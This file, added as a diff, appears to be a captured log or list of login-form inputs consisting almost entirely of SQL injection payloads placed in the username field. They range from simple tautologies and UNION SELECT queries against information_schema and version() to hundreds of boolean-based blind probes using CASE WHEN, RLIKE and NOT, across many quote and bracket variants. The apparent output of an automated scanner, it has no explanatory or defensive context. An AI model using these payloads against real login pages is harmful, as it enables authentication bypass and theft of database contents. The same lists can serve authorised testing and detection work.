@@ -1,0 +1,1232 @@
+User Name:adminPassword:admin
+User Name:adminPassword:admin
+User Name:adminPassword:admin
+User Name:adminPassword:admin
+User Name:' or '1'='1Password:' or '1'='1
+User Name:' union select 1,2,3#Password:' union select 1,2,3#
+User Name:' or 1=1--Password:' or 1=1--
+User Name:' union select null,version(),null#Password:' union select null,version(),null#
+User Name:' union select table_name,table_schema,3 from information_schema.tables#Password:' union select table_name,table_schema,3 from information_schema.tables#
+User Name:adminPassword:admin
+User Name:1' or '1'='1Password:1' or '1'='1
+User Name:1' union select 1,2,3#Password:1' union select 1,2,3#
+User Name:' or 1=1--Password:' or 1=1--
+User Name:' union select null,version()--Password:' union select null,version()--
+User Name:' union select table_name,table_schema from information_schema.tables--Password:' union select table_name,table_schema from information_schema.tables--
+User Name:adminPassword:admin
+User Name:adminPassword:admin
+User Name:adminPassword:admin
+User Name:2477Password:admin
+User Name:admin)((,".(¿',.¿'1Password:admin
+User Name:admin¿'HONctI<'">ABViGM¿'1Password:admin
+User Name:adminPassword:admin
+User Name:admin¿')5612'DCHs¿'1Password:admin
+User Name:admin¿')8471'KkOK¿'1Password:admin
+User Name:admin¿'))9266'KAHq¿'1Password:admin
+User Name:admin¿'))8471'JECa¿'1Password:admin
+User Name:admin¿'5044'hCho¿'1Password:admin
+User Name:admin¿'8471'MUsC¿'1Password:admin
+User Name:admin¿')3037'Qhiz¿'1Password:admin
+User Name:admin¿')8471'axms¿'1Password:admin
+User Name:admin%¿'9782'gAAl¿'1Password:admin
+User Name:admin%¿'8471'Ikgj¿'1Password:admin
+User Name:admin¿'3786'rWZx¿'1Password:admin
+User Name:admin¿'8471'FYLR¿'1Password:admin
+User Name:admin") AND 3746=1051 AND ("wRHN"="wRHNPassword:admin
+User Name:admin") AND 8471=8471 AND ("QxRt"="QxRtPassword:admin
+User Name:admin" AND 9905=6222 AND "kzkO"="kzkOPassword:admin
+User Name:admin" AND 8471=8471 AND "bfGY"="bfGYPassword:admin
+User Name:admin) AND 6311=6098 AND (5480=5480Password:admin
+User Name:admin) AND 8471=8471 AND (6745=6745Password:admin
+User Name:admin)) AND 7994=9811 AND ((8445=8445Password:admin
+User Name:admin)) AND 8471=8471 AND ((7378=7378Password:admin
+User Name:admin AND 2847=9675Password:admin
+User Name:admin AND 8471=8471Password:admin
+User Name:admin AND 1117=9396-- ZMgYPassword:admin
+User Name:admin AND 8471=8471-- YhYYPassword:admin
+User Name:-2607Password:admin
+User Name:-4229¿')4112'SfeQ¿'1Password:admin
+User Name:-8724¿')9563'irKw¿'1Password:admin
+User Name:-1515¿')6525'pYmj¿'1Password:admin
+User Name:-8476¿'))4878'zdBZ¿'1Password:admin
+User Name:-6936¿'))9563'foaa¿'1Password:admin
+User Name:-5763¿'))1054'hMKf¿'1Password:admin
+User Name:-8112¿'1431'wNAb¿'1Password:admin
+User Name:-5227¿'9563'MxvG¿'1Password:admin
+User Name:-6994¿'2131'cWrR¿'1Password:admin
+User Name:-5813¿')7009'oVLl¿'1Password:admin
+User Name:-9068¿')9563'gMfE¿'1Password:admin
+User Name:-4197¿')7789'OMme¿'1Password:admin
+User Name:-2734%¿'8171'pWoH¿'1Password:admin
+User Name:-5518%¿'9563'XuSq¿'1Password:admin
+User Name:-1591%¿'2673'yBWL¿'1Password:admin
+User Name:-2674¿'4222'JnhN¿'1Password:admin
+User Name:-7738¿'9563'QRKc¿'1Password:admin
+User Name:-1138¿'2017'eMjR¿'1Password:admin
+User Name:-2646") OR 4616=2889 AND ("Qvcv"="QvcvPassword:admin
+User Name:-7641") OR 9563=9563 AND ("fcDk"="fcDkPassword:admin
+User Name:-7183" OR 6610=9781 AND "ZQno"="ZQnoPassword:admin
+User Name:-8108" OR 9563=9563 AND "xLdc"="xLdcPassword:admin
+User Name:-4985) OR 3953=6008 AND (2112=2112Password:admin
+User Name:-5934) OR 9563=9563 AND (6728=6728Password:admin
+User Name:-9181)) OR 8852=9865 AND ((5638=5638Password:admin
+User Name:-7963)) OR 9563=9563 AND ((1662=1662Password:admin
+User Name:-2778 OR 8311=9439Password:admin
+User Name:-6063 OR 9563=9563Password:admin
+User Name:-1704 OR 8556=6223-- cYUZPassword:admin
+User Name:-5575 OR 9563=9563-- mzdFPassword:admin
+User Name:admin¿')(SELECT (CASE WHEN (5818=7188) THEN 5818 ELSE (SELECT 7188 UNION SELECT 1236) END))-- -¿'1Password:admin
+User Name:admin¿')(SELECT (CASE WHEN (6782=6782) THEN 6782 ELSE (SELECT 7651 UNION SELECT 8910) END))-- -¿'1Password:admin
+User Name:admin¿'))(SELECT (CASE WHEN (8926=9431) THEN 8926 ELSE (SELECT 9431 UNION SELECT 7419) END))-- -¿'1Password:admin
+User Name:admin¿'))(SELECT (CASE WHEN (6782=6782) THEN 6782 ELSE (SELECT 7651 UNION SELECT 8910) END))-- -¿'1Password:admin
+User Name:admin¿'(SELECT (CASE WHEN (8764=8976) THEN 8764 ELSE (SELECT 8976 UNION SELECT 7771) END))-- -¿'1Password:admin
+User Name:admin¿'(SELECT (CASE WHEN (6782=6782) THEN 6782 ELSE (SELECT 7651 UNION SELECT 8910) END))-- -¿'1Password:admin
+User Name:admin%¿'(SELECT (CASE WHEN (3634=6380) THEN 3634 ELSE (SELECT 6380 UNION SELECT 4548) END))-- -¿'1Password:admin
+User Name:admin%¿'(SELECT (CASE WHEN (6782=6782) THEN 6782 ELSE (SELECT 7651 UNION SELECT 8910) END))-- -¿'1Password:admin
+User Name:admin") AND 7185=(SELECT (CASE WHEN (7185=2733) THEN 7185 ELSE (SELECT 2733 UNION SELECT 1786) END))-- -Password:admin
+User Name:admin") AND 6782=(SELECT (CASE WHEN (6782=6782) THEN 6782 ELSE (SELECT 7651 UNION SELECT 8910) END))-- -Password:admin
+User Name:admin" AND 9512=(SELECT (CASE WHEN (9512=6930) THEN 9512 ELSE (SELECT 6930 UNION SELECT 4579) END))-- -Password:admin
+User Name:admin" AND 6782=(SELECT (CASE WHEN (6782=6782) THEN 6782 ELSE (SELECT 7651 UNION SELECT 8910) END))-- -Password:admin
+User Name:admin) AND 8286=(SELECT (CASE WHEN (8286=4324) THEN 8286 ELSE (SELECT 4324 UNION SELECT 6833) END))-- -Password:admin
+User Name:admin) AND 6782=(SELECT (CASE WHEN (6782=6782) THEN 6782 ELSE (SELECT 7651 UNION SELECT 8910) END))-- -Password:admin
+User Name:admin)) AND 3926=(SELECT (CASE WHEN (3926=2405) THEN 3926 ELSE (SELECT 2405 UNION SELECT 6538) END))-- -Password:admin
+User Name:admin)) AND 6782=(SELECT (CASE WHEN (6782=6782) THEN 6782 ELSE (SELECT 7651 UNION SELECT 8910) END))-- -Password:admin
+User Name:admin AND 5190=(SELECT (CASE WHEN (5190=6602) THEN 5190 ELSE (SELECT 6602 UNION SELECT 4364) END))-- -Password:admin
+User Name:admin AND 6782=(SELECT (CASE WHEN (6782=6782) THEN 6782 ELSE (SELECT 7651 UNION SELECT 8910) END))-- -Password:admin
+User Name:-2928¿')(SELECT (CASE WHEN (4059=9387) THEN 4059 ELSE (SELECT 9387 UNION SELECT 4604) END))-- -¿'1Password:admin
+User Name:-2545¿')(SELECT (CASE WHEN (8657=8657) THEN 8657 ELSE (SELECT 6563 UNION SELECT 6055) END))-- -¿'1Password:admin
+User Name:-8706¿')(SELECT (CASE WHEN (9296=8534) THEN 9296 ELSE (SELECT 8534 UNION SELECT 1112) END))-- -¿'1Password:admin
+User Name:-9182¿'))(SELECT (CASE WHEN (2785=3759) THEN 2785 ELSE (SELECT 3759 UNION SELECT 1016) END))-- -¿'1Password:admin
+User Name:-3753¿'))(SELECT (CASE WHEN (8657=8657) THEN 8657 ELSE (SELECT 6563 UNION SELECT 6055) END))-- -¿'1Password:admin
+User Name:-1434¿'))(SELECT (CASE WHEN (2335=6736) THEN 2335 ELSE (SELECT 6736 UNION SELECT 5926) END))-- -¿'1Password:admin
+User Name:-3549¿'(SELECT (CASE WHEN (4202=3518) THEN 4202 ELSE (SELECT 3518 UNION SELECT 1422) END))-- -¿'1Password:admin
+User Name:-4330¿'(SELECT (CASE WHEN (8657=8657) THEN 8657 ELSE (SELECT 6563 UNION SELECT 6055) END))-- -¿'1Password:admin
+User Name:-7574¿'(SELECT (CASE WHEN (1100=8863) THEN 1100 ELSE (SELECT 8863 UNION SELECT 3774) END))-- -¿'1Password:admin
+User Name:-4539%¿'(SELECT (CASE WHEN (9056=9921) THEN 9056 ELSE (SELECT 9921 UNION SELECT 7087) END))-- -¿'1Password:admin
+User Name:-9540%¿'(SELECT (CASE WHEN (8657=8657) THEN 8657 ELSE (SELECT 6563 UNION SELECT 6055) END))-- -¿'1Password:admin
+User Name:-5785%¿'(SELECT (CASE WHEN (3670=5734) THEN 3670 ELSE (SELECT 5734 UNION SELECT 2633) END))-- -¿'1Password:admin
+User Name:-4185") OR 7021=(SELECT (CASE WHEN (7021=7045) THEN 7021 ELSE (SELECT 7045 UNION SELECT 7975) END))-- -Password:admin
+User Name:-8724") OR 8657=(SELECT (CASE WHEN (8657=8657) THEN 8657 ELSE (SELECT 6563 UNION SELECT 6055) END))-- -Password:admin
+User Name:-5716" OR 8741=(SELECT (CASE WHEN (8741=9046) THEN 8741 ELSE (SELECT 9046 UNION SELECT 6626) END))-- -Password:admin
+User Name:-3558" OR 8657=(SELECT (CASE WHEN (8657=8657) THEN 8657 ELSE (SELECT 6563 UNION SELECT 6055) END))-- -Password:admin
+User Name:-3804) OR 9407=(SELECT (CASE WHEN (9407=9765) THEN 9407 ELSE (SELECT 9765 UNION SELECT 6550) END))-- -Password:admin
+User Name:-7363) OR 8657=(SELECT (CASE WHEN (8657=8657) THEN 8657 ELSE (SELECT 6563 UNION SELECT 6055) END))-- -Password:admin
+User Name:-3598)) OR 7401=(SELECT (CASE WHEN (7401=6396) THEN 7401 ELSE (SELECT 6396 UNION SELECT 2476) END))-- -Password:admin
+User Name:-9176)) OR 8657=(SELECT (CASE WHEN (8657=8657) THEN 8657 ELSE (SELECT 6563 UNION SELECT 6055) END))-- -Password:admin
+User Name:-8153 OR 1680=(SELECT (CASE WHEN (1680=1701) THEN 1680 ELSE (SELECT 1701 UNION SELECT 7349) END))-- -Password:admin
+User Name:-4704 OR 8657=(SELECT (CASE WHEN (8657=8657) THEN 8657 ELSE (SELECT 6563 UNION SELECT 6055) END))-- -Password:admin
+User Name:admin¿')4025-- -¿'1Password:admin
+User Name:admin¿')9143-- -¿'1Password:admin
+User Name:admin¿'))9821-- -¿'1Password:admin
+User Name:admin¿'))9143-- -¿'1Password:admin
+User Name:admin¿'1738-- -¿'1Password:admin
+User Name:admin¿'9143-- -¿'1Password:admin
+User Name:admin%¿'1285-- -¿'1Password:admin
+User Name:admin%¿'9143-- -¿'1Password:admin
+User Name:admin") AND 6861=4811-- -Password:admin
+User Name:admin") AND 9143=9143-- -Password:admin
+User Name:admin" AND 3192=6944-- -Password:admin
+User Name:admin" AND 9143=9143-- -Password:admin
+User Name:admin) AND 8137=3874-- -Password:admin
+User Name:admin) AND 9143=9143-- -Password:admin
+User Name:admin)) AND 1656=7365-- -Password:admin
+User Name:admin)) AND 9143=9143-- -Password:admin
+User Name:admin AND 7849=8318-- -Password:admin
+User Name:admin AND 9143=9143-- -Password:admin
+User Name:-3845¿')4921-- -¿'1Password:admin
+User Name:-9356¿')1632-- -¿'1Password:admin
+User Name:-3725¿')8797-- -¿'1Password:admin
+User Name:-3098¿'))3673-- -¿'1Password:admin
+User Name:-5324¿'))1632-- -¿'1Password:admin
+User Name:-8436¿'))9922-- -¿'1Password:admin
+User Name:-3611¿'3623-- -¿'1Password:admin
+User Name:-5695¿'1632-- -¿'1Password:admin
+User Name:-3683¿'7691-- -¿'1Password:admin
+User Name:-8846%¿'3290-- -¿'1Password:admin
+User Name:-9177%¿'1632-- -¿'1Password:admin
+User Name:-2214%¿'5015-- -¿'1Password:admin
+User Name:-5948") OR 8674=8677-- -Password:admin
+User Name:-6980") OR 1632=1632-- -Password:admin
+User Name:-7880" OR 6399=7936-- -Password:admin
+User Name:-2738" OR 1632=1632-- -Password:admin
+User Name:-6612) OR 4046=9174-- -Password:admin
+User Name:-1287) OR 1632=1632-- -Password:admin
+User Name:-4028)) OR 3073=3105-- -Password:admin
+User Name:-7664)) OR 1632=1632-- -Password:admin
+User Name:-1904 OR 2966=7642-- -Password:admin
+User Name:-3640 OR 1632=1632-- -Password:admin
+User Name:(SELECT (CASE WHEN (8867=6671) THEN 0x61646d696e ELSE (SELECT 6671 UNION SELECT 2351) END))Password:admin
+User Name:(SELECT (CASE WHEN (4841=4841) THEN 0x61646d696e ELSE (SELECT 6649 UNION SELECT 2081) END))Password:admin
+User Name:(CASE WHEN (5293=4098) THEN 5293 ELSE 5293*(SELECT 5293 FROM DUAL UNION SELECT 4098 FROM DUAL) END)Password:admin
+User Name:(CASE WHEN (6477=6477) THEN 6477 ELSE 6477*(SELECT 6477 FROM DUAL UNION SELECT 5797 FROM DUAL) END)Password:admin
+User Name:(CASE WHEN 2011=1313 THEN 2011 ELSE NULL END)Password:admin
+User Name:(CASE WHEN 5438=5438 THEN 5438 ELSE NULL END)Password:admin
+User Name:(SELECT CONCAT(CONCAT(0x716b7a6b71,(CASE WHEN (3197=3197) THEN 0x31 ELSE 0x30 END)),0x716b6a6b71))Password:admin
+User Name:admin¿')1480#¿'1Password:admin
+User Name:admin¿')1651#¿'1Password:admin
+User Name:admin¿'5038#¿'1Password:admin
+User Name:admin¿'1651#¿'1Password:admin
+User Name:admin" AND 6554=3105#Password:admin
+User Name:admin" AND 1651=1651#Password:admin
+User Name:admin¿'))3784#¿'1Password:admin
+User Name:admin¿'))1651#¿'1Password:admin
+User Name:admin¿')))4438#¿'1Password:admin
+User Name:admin¿')))1651#¿'1Password:admin
+User Name:admin%¿'2854#¿'1Password:admin
+User Name:admin%¿'1651#¿'1Password:admin
+User Name:admin") AND 9411=7142#Password:admin
+User Name:admin") AND 1651=1651#Password:admin
+User Name:admin")) AND 5699=8689#Password:admin
+User Name:admin")) AND 1651=1651#Password:admin
+User Name:admin"))) AND 2282=5743#Password:admin
+User Name:admin"))) AND 1651=1651#Password:admin
+User Name:admin¿')) AS kYIx WHERE 8671=86717869#¿'1Password:admin
+User Name:admin¿')) AS qYZv WHERE 6603=66031651#¿'1Password:admin
+User Name:admin")) AS GjNY WHERE 9681=9681 AND 5645=2437#Password:admin
+User Name:admin")) AS XCgJ WHERE 8969=8969 AND 1651=1651#Password:admin
+User Name:admin¿') AS FjJi WHERE 5036=50364071#¿'1Password:admin
+User Name:admin¿') AS aTed WHERE 3950=39501651#¿'1Password:admin
+User Name:admin") AS yuuE WHERE 8826=8826 AND 1992=7196#Password:admin
+User Name:admin") AS RHUE WHERE 9501=9501 AND 1651=1651#Password:admin
+User Name:admin¿' IN BOOLEAN MODE)1480#¿'1Password:admin
+User Name:admin¿' IN BOOLEAN MODE)1651#¿'1Password:admin
+User Name:admin) AND 3077=2695#Password:admin
+User Name:admin) AND 1651=1651#Password:admin
+User Name:admin)) AND 9933=8747#Password:admin
+User Name:admin)) AND 1651=1651#Password:admin
+User Name:admin))) AND 2051=7801#Password:admin
+User Name:admin))) AND 1651=1651#Password:admin
+User Name:admin AND 2352=7755#Password:admin
+User Name:admin AND 1651=1651#Password:admin
+User Name:admin)) AS Ybac WHERE 6646=6646 AND 7331=4461#Password:admin
+User Name:admin)) AS TdgS WHERE 4878=4878 AND 1651=1651#Password:admin
+User Name:admin) AS AVzM WHERE 4965=4965 AND 2566=5541#Password:admin
+User Name:admin) AS lHJg WHERE 1022=1022 AND 1651=1651#Password:admin
+User Name:admin` WHERE 1822=1822 AND 7408=5905#Password:admin
+User Name:admin` WHERE 5699=5699 AND 1651=1651#Password:admin
+User Name:admin`) WHERE 5472=5472 AND 3017=3506#Password:admin
+User Name:admin`) WHERE 7867=7867 AND 1651=1651#Password:admin
+User Name:-3276¿')2664#¿'1Password:admin
+User Name:-3775¿')5365#¿'1Password:admin
+User Name:-3941¿')5489#¿'1Password:admin
+User Name:-4134¿'9264#¿'1Password:admin
+User Name:-3591¿'5365#¿'1Password:admin
+User Name:-6450¿'2658#¿'1Password:admin
+User Name:-2338" OR 2300=7713#Password:admin
+User Name:-3273" OR 5365=5365#Password:admin
+User Name:-9973¿'))9136#¿'1Password:admin
+User Name:-7479¿'))5365#¿'1Password:admin
+User Name:-3612¿'))4484#¿'1Password:admin
+User Name:-2503¿')))3703#¿'1Password:admin
+User Name:-1353¿')))5365#¿'1Password:admin
+User Name:-5937¿')))1171#¿'1Password:admin
+User Name:-2767%¿'8210#¿'1Password:admin
+User Name:-3982%¿'5365#¿'1Password:admin
+User Name:-7775%¿'2185#¿'1Password:admin
+User Name:-9207") OR 5528=2305#Password:admin
+User Name:-5675") OR 5365=5365#Password:admin
+User Name:-7438")) OR 9258=2636#Password:admin
+User Name:-9614")) OR 5365=5365#Password:admin
+User Name:-1128"))) OR 2503=2674#Password:admin
+User Name:-6560"))) OR 5365=5365#Password:admin
+User Name:-3368¿')) AS YHaY WHERE 4960=49604266#¿'1Password:admin
+User Name:-9346¿')) AS xQjI WHERE 7450=74505365#¿'1Password:admin
+User Name:-7352¿')) AS bzZY WHERE 4237=42371841#¿'1Password:admin
+User Name:-2540")) AS ltBi WHERE 8149=8149 OR 4871=8175#Password:admin
+User Name:-5239")) AS GCXL WHERE 7199=7199 OR 5365=5365#Password:admin
+User Name:-2498¿') AS EVHh WHERE 4983=49836966#¿'1Password:admin
+User Name:-7746¿') AS HjJh WHERE 4125=41255365#¿'1Password:admin
+User Name:-2188¿') AS dMLU WHERE 7401=74018779#¿'1Password:admin
+User Name:-2986") AS IZIf WHERE 8763=8763 OR 9208=9943#Password:admin
+User Name:-6971") AS PZxM WHERE 2627=2627 OR 5365=5365#Password:admin
+User Name:-7291) OR 3691=6890#Password:admin
+User Name:-8637) OR 5365=5365#Password:admin
+User Name:-4673)) OR 6949=6194#Password:admin
+User Name:-6745)) OR 5365=5365#Password:admin
+User Name:-4265))) OR 4577=7022#Password:admin
+User Name:-3002))) OR 5365=5365#Password:admin
+User Name:-9422 OR 3985=5300#Password:admin
+User Name:-4145 OR 5365=5365#Password:admin
+User Name:-4587)) AS fJPy WHERE 6909=6909 OR 6765=3542#Password:admin
+User Name:-7411)) AS HNbX WHERE 9571=9571 OR 5365=5365#Password:admin
+User Name:-7925) AS VIAj WHERE 3982=3982 OR 9110=7107#Password:admin
+User Name:-4175) AS mGch WHERE 7158=7158 OR 5365=5365#Password:admin
+User Name:admin¿') OR NOT 2740=3109#Password:admin
+User Name:admin¿') OR NOT 6461=6461#Password:admin
+User Name:admin¿' OR NOT 4609=9600#Password:admin
+User Name:admin¿' OR NOT 6461=6461#Password:admin
+User Name:admin" OR NOT 1649=7739#Password:admin
+User Name:admin" OR NOT 6461=6461#Password:admin
+User Name:admin¿')) OR NOT 3660=4906#Password:admin
+User Name:admin¿')) OR NOT 6461=6461#Password:admin
+User Name:admin¿'))) OR NOT 9885=9294#Password:admin
+User Name:admin¿'))) OR NOT 6461=6461#Password:admin
+User Name:admin%¿' OR NOT 8204=7579#Password:admin
+User Name:admin%¿' OR NOT 6461=6461#Password:admin
+User Name:admin") OR NOT 4500=1992#Password:admin
+User Name:admin") OR NOT 6461=6461#Password:admin
+User Name:admin")) OR NOT 2164=4140#Password:admin
+User Name:admin")) OR NOT 6461=6461#Password:admin
+User Name:admin"))) OR NOT 1903=6352#Password:admin
+User Name:admin"))) OR NOT 6461=6461#Password:admin
+User Name:admin¿')) AS trGK WHERE 8192=8192 OR NOT 5475=7026#Password:admin
+User Name:admin¿')) AS yboz WHERE 1012=1012 OR NOT 6461=6461#Password:admin
+User Name:admin")) AS OMde WHERE 4738=4738 OR NOT 2300=6884#Password:admin
+User Name:admin")) AS YSbx WHERE 1387=1387 OR NOT 6461=6461#Password:admin
+User Name:admin¿') AS gLmr WHERE 5401=5401 OR NOT 1542=2136#Password:admin
+User Name:admin¿') AS Dvcx WHERE 5584=5584 OR NOT 6461=6461#Password:admin
+User Name:admin") AS SyfW WHERE 7274=7274 OR NOT 1221=9463#Password:admin
+User Name:admin") AS fzCq WHERE 7851=7851 OR NOT 6461=6461#Password:admin
+User Name:admin¿' IN BOOLEAN MODE) OR NOT 4912=1928#Password:admin
+User Name:admin¿' IN BOOLEAN MODE) OR NOT 6461=6461#Password:admin
+User Name:admin) OR NOT 6832=1118#Password:admin
+User Name:admin) OR NOT 6461=6461#Password:admin
+User Name:admin)) OR NOT 5973=4824#Password:admin
+User Name:admin)) OR NOT 6461=6461#Password:admin
+User Name:admin))) OR NOT 2494=6648#Password:admin
+User Name:admin))) OR NOT 6461=6461#Password:admin
+User Name:admin OR NOT 2180=4403#Password:admin
+User Name:admin OR NOT 6461=6461#Password:admin
+User Name:admin)) AS FbCB WHERE 7954=7954 OR NOT 3949=7352#Password:admin
+User Name:admin)) AS iiGM WHERE 9488=9488 OR NOT 6461=6461#Password:admin
+User Name:admin) AS egGZ WHERE 6209=6209 OR NOT 2816=5187#Password:admin
+User Name:admin) AS sPLZ WHERE 4826=4826 OR NOT 6461=6461#Password:admin
+User Name:admin` WHERE 2690=2690 OR NOT 9420=8417#Password:admin
+User Name:admin` WHERE 8924=8924 OR NOT 6461=6461#Password:admin
+User Name:admin`) WHERE 5121=5121 OR NOT 6675=3572#Password:admin
+User Name:admin`) WHERE 8743=8743 OR NOT 6461=6461#Password:admin
+User Name:admin¿') RLIKE (SELECT (CASE WHEN (8530=2920) THEN 0x61646d696e ELSE 0x28 END))-- hCiAPassword:admin
+User Name:admin¿') RLIKE (SELECT (CASE WHEN (7167=7167) THEN 0x61646d696e ELSE 0x28 END))-- GiKhPassword:admin
+User Name:admin¿' RLIKE (SELECT (CASE WHEN (5264=2172) THEN 0x61646d696e ELSE 0x28 END))-- aHNoPassword:admin
+User Name:admin¿' RLIKE (SELECT (CASE WHEN (7167=7167) THEN 0x61646d696e ELSE 0x28 END))-- jjWGPassword:admin
+User Name:admin" RLIKE (SELECT (CASE WHEN (9237=7271) THEN 0x61646d696e ELSE 0x28 END))-- ZTGtPassword:admin
+User Name:admin" RLIKE (SELECT (CASE WHEN (7167=7167) THEN 0x61646d696e ELSE 0x28 END))-- sQWRPassword:admin
+User Name:admin¿') RLIKE (SELECT (CASE WHEN (5912=2155) THEN 0x61646d696e ELSE 0x28 END))'cKti¿'1Password:admin
+User Name:admin¿') RLIKE (SELECT (CASE WHEN (7167=7167) THEN 0x61646d696e ELSE 0x28 END))'xcnU¿'1Password:admin
+User Name:admin¿')) RLIKE (SELECT (CASE WHEN (8122=1848) THEN 0x61646d696e ELSE 0x28 END))'ltZE¿'1Password:admin
+User Name:admin¿')) RLIKE (SELECT (CASE WHEN (7167=7167) THEN 0x61646d696e ELSE 0x28 END))'JtDs¿'1Password:admin
+User Name:admin¿'))) RLIKE (SELECT (CASE WHEN (3570=9771) THEN 0x61646d696e ELSE 0x28 END))'QoFG¿'1Password:admin
+User Name:admin¿'))) RLIKE (SELECT (CASE WHEN (7167=7167) THEN 0x61646d696e ELSE 0x28 END))'sKHj¿'1Password:admin
+User Name:admin¿' RLIKE (SELECT (CASE WHEN (5348=8752) THEN 0x61646d696e ELSE 0x28 END))'cWCO¿'1Password:admin
+User Name:admin¿' RLIKE (SELECT (CASE WHEN (7167=7167) THEN 0x61646d696e ELSE 0x28 END))'RIAa¿'1Password:admin
+User Name:admin¿') RLIKE (SELECT (CASE WHEN (4741=2849) THEN 0x61646d696e ELSE 0x28 END))'bXmY¿'1Password:admin
+User Name:admin¿') RLIKE (SELECT (CASE WHEN (7167=7167) THEN 0x61646d696e ELSE 0x28 END))'tAZF¿'1Password:admin
+User Name:admin¿')) RLIKE (SELECT (CASE WHEN (7180=3040) THEN 0x61646d696e ELSE 0x28 END))'QCSI¿'1Password:admin
+User Name:admin¿')) RLIKE (SELECT (CASE WHEN (7167=7167) THEN 0x61646d696e ELSE 0x28 END))'NSpX¿'1Password:admin
+User Name:admin¿'))) RLIKE (SELECT (CASE WHEN (5027=5468) THEN 0x61646d696e ELSE 0x28 END))'uAlg¿'1Password:admin
+User Name:admin¿'))) RLIKE (SELECT (CASE WHEN (7167=7167) THEN 0x61646d696e ELSE 0x28 END))'Awid¿'1Password:admin
+User Name:admin%¿' RLIKE (SELECT (CASE WHEN (4487=2250) THEN 0x61646d696e ELSE 0x28 END))'IkAW¿'1Password:admin
+User Name:admin%¿' RLIKE (SELECT (CASE WHEN (7167=7167) THEN 0x61646d696e ELSE 0x28 END))'GboU¿'1Password:admin
+User Name:admin¿' RLIKE (SELECT (CASE WHEN (1373=2235) THEN 0x61646d696e ELSE 0x28 END))'bGhS¿'1Password:admin
+User Name:admin¿' RLIKE (SELECT (CASE WHEN (7167=7167) THEN 0x61646d696e ELSE 0x28 END))'JzRo¿'1Password:admin
+User Name:admin") RLIKE (SELECT (CASE WHEN (3632=1896) THEN 0x61646d696e ELSE 0x28 END)) AND ("Ekcc"="EkccPassword:admin
+User Name:admin") RLIKE (SELECT (CASE WHEN (7167=7167) THEN 0x61646d696e ELSE 0x28 END)) AND ("INMM"="INMMPassword:admin
+User Name:admin")) RLIKE (SELECT (CASE WHEN (8305=1781) THEN 0x61646d696e ELSE 0x28 END)) AND (("DdGB"="DdGBPassword:admin
+User Name:admin")) RLIKE (SELECT (CASE WHEN (7167=7167) THEN 0x61646d696e ELSE 0x28 END)) AND (("aLyd"="aLydPassword:admin
+User Name:admin"))) RLIKE (SELECT (CASE WHEN (3527=3954) THEN 0x61646d696e ELSE 0x28 END)) AND ((("Phhm"="PhhmPassword:admin
+User Name:admin"))) RLIKE (SELECT (CASE WHEN (7167=7167) THEN 0x61646d696e ELSE 0x28 END)) AND ((("wVGl"="wVGlPassword:admin
+User Name:admin" RLIKE (SELECT (CASE WHEN (7416=2191) THEN 0x61646d696e ELSE 0x28 END)) AND "Slxh"="SlxhPassword:admin
+User Name:admin" RLIKE (SELECT (CASE WHEN (7167=7167) THEN 0x61646d696e ELSE 0x28 END)) AND "uAcK"="uAcKPassword:admin
+User Name:admin") RLIKE (SELECT (CASE WHEN (7026=8162) THEN 0x61646d696e ELSE 0x28 END)) AND ("aijH" LIKE "aijHPassword:admin
+User Name:admin") RLIKE (SELECT (CASE WHEN (7167=7167) THEN 0x61646d696e ELSE 0x28 END)) AND ("WZTm" LIKE "WZTmPassword:admin
+User Name:admin")) RLIKE (SELECT (CASE WHEN (7388=6046) THEN 0x61646d696e ELSE 0x28 END)) AND (("kmuP" LIKE "kmuPPassword:admin
+User Name:admin")) RLIKE (SELECT (CASE WHEN (7167=7167) THEN 0x61646d696e ELSE 0x28 END)) AND (("FDMT" LIKE "FDMTPassword:admin
+User Name:admin"))) RLIKE (SELECT (CASE WHEN (9344=6173) THEN 0x61646d696e ELSE 0x28 END)) AND ((("RkeJ" LIKE "RkeJPassword:admin
+User Name:admin"))) RLIKE (SELECT (CASE WHEN (7167=7167) THEN 0x61646d696e ELSE 0x28 END)) AND ((("hfyQ" LIKE "hfyQPassword:admin
+User Name:admin" RLIKE (SELECT (CASE WHEN (1363=1686) THEN 0x61646d696e ELSE 0x28 END)) AND "Gdbw" LIKE "GdbwPassword:admin
+User Name:admin" RLIKE (SELECT (CASE WHEN (7167=7167) THEN 0x61646d696e ELSE 0x28 END)) AND "wOtL" LIKE "wOtLPassword:admin
+User Name:admin¿' RLIKE (SELECT (CASE WHEN (5288=3681) THEN 0x61646d696e ELSE 0x28 END))'Cssk¿'1Password:admin
+User Name:admin¿' RLIKE (SELECT (CASE WHEN (7167=7167) THEN 0x61646d696e ELSE 0x28 END))'waaa¿'1Password:admin
+User Name:admin¿')) AS aRse WHERE 3254=3254 RLIKE (SELECT (CASE WHEN (2186=5804) THEN 0x61646d696e ELSE 0x28 END))-- fGBrPassword:admin
+User Name:admin¿')) AS VIaU WHERE 3476=3476 RLIKE (SELECT (CASE WHEN (7167=7167) THEN 0x61646d696e ELSE 0x28 END))-- iUBJPassword:admin
+User Name:admin")) AS Soli WHERE 5800=5800 RLIKE (SELECT (CASE WHEN (5655=6697) THEN 0x61646d696e ELSE 0x28 END))-- xcmwPassword:admin
+User Name:admin")) AS bbjn WHERE 5430=5430 RLIKE (SELECT (CASE WHEN (7167=7167) THEN 0x61646d696e ELSE 0x28 END))-- jhObPassword:admin
+User Name:admin¿') AS CDzM WHERE 2892=2892 RLIKE (SELECT (CASE WHEN (3174=2066) THEN 0x61646d696e ELSE 0x28 END))-- DrtePassword:admin
+User Name:admin¿') AS EvpD WHERE 8336=8336 RLIKE (SELECT (CASE WHEN (7167=7167) THEN 0x61646d696e ELSE 0x28 END))-- seSpPassword:admin
+User Name:admin") AS EgZV WHERE 1128=1128 RLIKE (SELECT (CASE WHEN (7704=5825) THEN 0x61646d696e ELSE 0x28 END))-- cMJvPassword:admin
+User Name:admin") AS NfUf WHERE 7220=7220 RLIKE (SELECT (CASE WHEN (7167=7167) THEN 0x61646d696e ELSE 0x28 END))-- gXywPassword:admin
+User Name:admin¿' IN BOOLEAN MODE) RLIKE (SELECT (CASE WHEN (7882=9471) THEN 0x61646d696e ELSE 0x28 END))#Password:admin
+User Name:admin¿' IN BOOLEAN MODE) RLIKE (SELECT (CASE WHEN (7167=7167) THEN 0x61646d696e ELSE 0x28 END))#Password:admin
+User Name:admin) RLIKE (SELECT (CASE WHEN (5659=9507) THEN 0x61646d696e ELSE 0x28 END))-- FAbTPassword:admin
+User Name:admin) RLIKE (SELECT (CASE WHEN (7167=7167) THEN 0x61646d696e ELSE 0x28 END))-- bGSSPassword:admin
